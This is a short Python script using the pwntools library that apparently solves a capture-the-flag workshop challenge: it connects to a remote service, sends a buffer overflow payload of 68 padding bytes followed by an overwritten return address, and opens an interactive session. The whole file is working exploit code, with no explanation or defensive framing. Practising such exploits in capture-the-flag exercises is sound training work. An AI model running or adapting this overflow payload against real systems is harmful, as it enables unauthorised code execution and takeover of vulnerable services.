from pwn import *

p = remote("ctfworkshop.cybr.club", 3000)

p.sendline(b'A'*68 + p32(0x08406688))

p.interactive()
